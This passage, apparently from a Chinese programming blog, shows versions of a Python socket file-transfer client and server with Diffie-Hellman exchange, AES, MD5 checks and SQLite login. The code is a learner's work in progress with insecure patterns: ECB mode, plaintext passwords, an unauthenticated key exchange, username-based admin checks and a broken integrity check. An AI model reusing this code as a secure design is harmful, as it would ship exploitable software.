query_thread(threading.Thread):</span><br><span class="line">    </span><br><span class="line">    def __init__(self,name = None):</span><br><span class="line">        threading.Thread.__init__(self,name=name)</span><br><span class="line"></span><br><span class="line">    def query_username(self,username):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT username FROM users WHERE username = ?&quot;, (username,))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def query_password(self,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        cursor.execute(&quot;SELECT password FROM users WHERE username = ? AND password = ?&quot;, (username, password))</span><br><span class="line">        result = cursor.fetchone()</span><br><span class="line">        cursor.close()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def add_user(sock,username,password):</span><br><span class="line">        conn = sqlite3.connect(&#x27;users.db&#x27;)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        try:</span><br><span class="line">            # 插入新的用户数据</span><br><span class="line">            cursor.execute(&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;, (username, password))</span><br><span class="line">            conn.commit()</span><br><span class="line">            sock.send(&quot;用户注册成功&quot;.encode())</span><br><span class="line">        except sqlite3.IntegrityError:</span><br><span class="line">            sock.send(&quot;用户已存在&quot;.encode())</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sock.send(e.encode())</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):</span><br><span class="line">    if isinstance(data, str): </span><br><span class="line">        data = data.encode()  # md5加密需要bytes参数</span><br><span class="line">    md5_hash = hashlib.md5()  #md5加密</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    </span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def key_switch(sock,public_key_server):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;开始进行公钥交换&quot;)</span><br><span class="line">    try:</span><br><span class="line">        public_key_client = sock.recv(1024)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;接受错误&quot;,e)</span><br><span class="line">    </span><br><span class="line">    public_key_bytes = public_key_server.public_bytes(    #将客户端的公钥序列化为 PEM 格式的字节串</span><br><span class="line">    encoding=serialization.Encoding.PEM,  </span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    sock.send(public_key_bytes)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_client) #将接受到的服务端公钥反序列化为公钥对象</span><br><span class="line"></span><br><span class="line">def decrypt_data(shared_key,data):   #data要为byte型</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    decrypted_data = aes.decrypt(data)</span><br><span class="line">    data = (unpad(decrypted_data, 16)).decode(&#x27;latin1&#x27;)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def unpack_data(sock,shared_key,orign_data):     #拆解数据包</span><br><span class="line">    sliced_sum = int.from_bytes(orign_data[:2],byteorder = &#x27;big&#x27;)</span><br><span class="line">    sliced_num = int.from_bytes(orign_data[2:4],byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_length = int.from_bytes(orign_data[4:8], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_type = int.from_bytes(orign_data[8:12], byteorder=&#x27;big&#x27;)</span><br><span class="line">    data_md5 = (orign_data[-32:]).decode()</span><br><span class="line">    data = decrypt_data(shared_key,orign_data[12:(data_length-32)])</span><br><span class="line">    value = verify_md5(data,data_md5)</span><br><span class="line">    if value == 0:</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode())</span><br><span class="line">    else :</span><br><span class="line">        sock.send((f&quot;第&#123;sliced_num+1&#125;组数据校验成功&quot;).encode())</span><br><span class="line">    return sliced_sum,sliced_num,data_type,data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Authentication(sock,shared_key,query_thread1):  #身份验证部分 账号密码存储在users.db数据库中</span><br><span class="line">    key = shared_key[:16]</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    username = (sock.recv(1024))</span><br><span class="line">    username = decrypt_data(shared_key,username)</span><br><span class="line">    result = query_thread1.query_username(username)</span><br><span class="line">    if result != None:</span><br><span class="line">        sock.send(f&quot;找到用户&#123;username&#125; 接下来进行密码验证&quot;.encode())</span><br><span class="line">        password = (sock.recv(1024))</span><br><span class="line">        decrypted_password = aes.decrypt(password)</span><br><span class="line">        password = (unpad(decrypted_password, 16)).decode()</span><br><span class="line">        result = query_thread1.query_password(username,password)</span><br><span class="line">        if result != None:</span><br><span class="line">            sock.send(&quot;身份验证通过&quot;.encode())</span><br><span class="line">            if username == &quot;admin&quot;:</span><br><span class="line">                permission_value = 1    </span><br><span class="line">            else :</span><br><span class="line">                permission_value = 0    </span><br><span class="line">            return permission_value</span><br><span class="line">        else :</span><br><span class="line">            sock.send(&quot;密码错误，终止连接&quot;.encode())</span><br><span class="line">            sock.close()</span><br><span class="line">            return 3</span><br><span class="line">    else:</span><br><span class="line">        sock.send(&quot;你输入的用户名不存在 终止本次连接&quot;.encode())</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def menu(sock):</span><br><span class="line">    text = &quot;开始进行数据传输&quot;</span><br><span class="line">    sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data):</span><br><span class="line">    print(f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data):  #处理非切片数据</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode( )</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    if data_type == &quot;text/plain&quot;:</span><br><span class="line">        with open(&quot;output.txt&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data)</span><br><span class="line">    sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">    print(f&quot;成功接受到文件&quot;)</span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,data,sliced_sum,sliced_num,shared_key): #处理切片数据</span><br><span class="line">    data_bytes = data</span><br><span class="line">    while sliced_num != sliced_sum-1:</span><br><span class="line">        orign_data = (sock.recv(3000))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            print(&quot;客户机中断连接&quot;)</span><br><span class="line">            return</span><br><span class="line">        sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    if data_type == &quot;image/png&quot;:</span><br><span class="line">        with open(&quot;output.png&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data_bytes)</span><br><span class="line">    elif data_type == &quot;audio/mpeg&quot;:</span><br><span class="line">        with open(&quot;output.mp3&quot;, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(data_bytes)</span><br><span class="line">    sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">    print(f&quot;成功接受到文件&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,data,query_thread1):</span><br><span class="line">    if permission_value == 0:                #管理员权限的检验较为简单</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0]</span><br><span class="line">        password = parts[1]</span><br><span class="line">        query_thread1.adduser(sock,username,password)</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:用户&#123;username&#125;注册成功&quot;)</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;)</span><br><span class="line">    public_key_client = key_switch(sock,public_key_server)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;公钥交换成功&quot;)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;开始进行身份验证&quot;)</span><br><span class="line">    permission_value = Authentication(sock,shared_key,query_thread1)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;)</span><br><span class="line">    if permission_value == 3:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;客户机中断连接&quot;)</span><br><span class="line">        return</span><br><span class="line">    while 1:</span><br><span class="line">        menu(sock)</span><br><span class="line">        orign_data = (sock.recv(3000))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;客户机中断连接&quot;)</span><br><span class="line">            break</span><br><span class="line">        sliced_sum,sliced_num,data_type,data = unpack_data(sock,shared_key,orign_data)</span><br><span class="line">        if data_type == 1:</span><br><span class="line">            transfer_txt(addr,data)</span><br><span class="line">        elif data_type == 2:</span><br><span class="line">            if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                transfer_file2(sock,data,sliced_sum,sliced_num,shared_key)</span><br><span class="line">            else:</span><br><span class="line">                transfer_file(sock,data)</span><br><span class="line">        elif data_type ==3:</span><br><span class="line">            register(permission_value,sock,data,query_thread1)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    pool = ThreadPoolExecutor(max_workers=5)   #定义一个线程池 拥有5个空闲线程</span><br><span class="line">    query_thread1 = query_thread()  #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用</span><br><span class="line">    </span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.bind((&quot;10.0.137.2&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;)</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice_text = &quot;&quot;&quot;</span><br><span class="line">        1.传输文本数据</span><br><span class="line">        2.传输文件数据</span><br><span class="line">        3.新增用户</span><br><span class="line">        4.断开连接</span><br><span class="line">输入选项:</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,data,shared_key,sliced,sum):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,data)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):   #交换公钥</span><br><span class="line">    print(&quot;等待连接服务端&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    print(&quot;连接上服务端 开始进行公钥交换&quot;)</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    data_bytes = pad(data, AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;开始进行身份验证&quot;)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)   #用户名经过aes加密后传输</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)   #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    transfer_data = pack_data(3,data,shared_key,0,0)</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key):</span><br><span class="line">    text = input(&quot;输入数据 :&quot;)   #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 </span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1000:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1000</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        begin_time = time.time()</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            text = (s.recv(1024)).decode()</span><br><span class="line">            currect_time = time.time()</span><br><span class="line">            temp = currect_time-begin_time</span><br><span class="line">            print(&quot;\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    print(&quot;开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    Authentication(s,shared_key)</span><br><span class="line">    print(&quot;成功连接&quot;)</span><br><span class="line">    while 1:</span><br><span class="line">        print((s.recv(1024)).decode())</span><br><span class="line">        choice = input(choice_text)</span><br><span class="line">        if choice == &quot;1&quot;:</span><br><span class="line">            transfer_txt(s,shared_key)</span><br><span class="line">        elif choice == &quot;2&quot;:</span><br><span class="line">            transfer_file(s,shared_key)</span><br><span class="line">        elif choice == &quot;3&quot;:</span><br><span class="line">            register(s,shared_key)</span><br><span class="line">        elif choice == &quot;4&quot;:</span><br><span class="line">            print(&quot;程序终止&quot;)</span><br><span class="line">            s.close()</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(&quot;未找到输入的选项，请重新输入&quot;)</span><br><span class="line">            continue</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="v0-7"><a href="#v0-7" class="headerlink" title="v0.7"></a>v0.7</h2><p>程序到这一版已经设计的比较完善了 可能还存在一些逻辑漏洞可以造成服务端宕机等问题 这个就留到后续的安全性分析吧 这一版本主要还是想优化一下文件传输的问题<br>目前的问题在于  校验数据完整性没有进行处理 比如如果失败 应该记录下失败的数据组序号 然后返回给客户机<br>然后就是识别文件类别的那块代码 现在用的是python-magic库来识别是属于什么文件 然后创建对应的文件用来存储接收到的数据<br>不过不是很确定这个库他是不是只是对文件头进行识别 如果是的话感觉还是相当好伪造的 这里应该有一个比较大的安全隐患<br>同时原本的类型处理也比较少 只适配了txt png mp3这三个最常见的格式 需要增加如果识别文件类型失败 就进行临时存储 同时报错<br>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">choice_text = &quot;&quot;&quot;</span><br><span class="line">        1.传输文本数据</span><br><span class="line">        2.传输文件数据</span><br><span class="line">        3.新增用户</span><br><span class="line">        4.断开连接</span><br><span class="line">输入选项:</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,data,shared_key,sliced,sum):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,data)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(s,public_key_client):   #交换公钥</span><br><span class="line">    print(&quot;等待连接服务端&quot;)</span><br><span class="line">    s.connect((&quot;69.165.67.133&quot;,6666))</span><br><span class="line">    print(&quot;连接上服务端 开始进行公钥交换&quot;)</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    return serialization.load_pem_public_key(public_key_server)</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    data_bytes = pad(data, AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key):</span><br><span class="line">    print(&quot;开始进行身份验证&quot;)</span><br><span class="line">    username = input(&quot;输入用户名:&quot;)</span><br><span class="line">    encrypt_username = encrypt_data(shared_key,username)   #用户名经过aes加密后传输</span><br><span class="line">    s.send(encrypt_username)</span><br><span class="line">    text = s.recv(1024).decode()</span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        print(text)</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        print(text)</span><br><span class="line">        password = input(&quot;输入密码:&quot;)</span><br><span class="line">        encrypt_password = encrypt_data(shared_key,password) #密码经过aes加密后传输</span><br><span class="line">        s.send(encrypt_password)</span><br><span class="line">        text = s.recv(1024).decode()</span><br><span class="line">        if text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">            print(text)</span><br><span class="line">            exit()</span><br><span class="line">        else :</span><br><span class="line">            print(text)</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key):</span><br><span class="line">    username = input(&quot;输入用户名 :&quot;)   #账号密码用;来间隔后 采用base64编码后丢到pack_data函数中处理</span><br><span class="line">    password = input(&quot;输入密码 :&quot;)</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    transfer_data = pack_data(3,data,shared_key,0,0)</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key):</span><br><span class="line">    text = input(&quot;输入数据 :&quot;)   #这个函数负责处理直接传输的文本数据 但是仍然对于是否需要切片进行了判断 </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key):</span><br><span class="line">    file_addr = input(&quot;请输入文件对于client.py的相对路径 :&quot;) #读取客户端本地文件的二进制流</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        print(f&quot;一共有&#123;sliced_sum&#125;组数据需要传输\n&quot;)</span><br><span class="line">        begin_time = time.time()</span><br><span class="line">        failure_msg = &quot;第&quot;</span><br><span class="line">        failure_number = None</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            text = (s.recv(1024)).decode()</span><br><span class="line">            if &quot;失败&quot; in text:</span><br><span class="line">                start_index = text.find(&#x27;&#123;&#x27;) + 1</span><br><span class="line">                end_index = text.find(&#x27;&#125;&#x27;)</span><br><span class="line">                failure_number = text[start_index:end_index]</span><br><span class="line">                failure_msg += failure_number+&quot;,&quot;</span><br><span class="line">            currect_time = time.time()</span><br><span class="line">            temp = currect_time-begin_time</span><br><span class="line">            print(&quot;\r&quot;+text+f&quot; 当前运行了&#123;temp:.0f&#125;s&quot;,end=&quot;&quot;)</span><br><span class="line">        failure_msg += &quot;组传输失败&quot;</span><br><span class="line">        if failure_number != None:</span><br><span class="line">            print(failure_msg)</span><br><span class="line">        print(&quot;\n&quot;,end=&quot;&quot;)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">        print((s.recv(1024)).decode()+&quot;\n&quot;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    public_key_server = key_switch(s,public_key_client)</span><br><span class="line">    print(&quot;公钥交换成功&quot;)</span><br><span class="line">    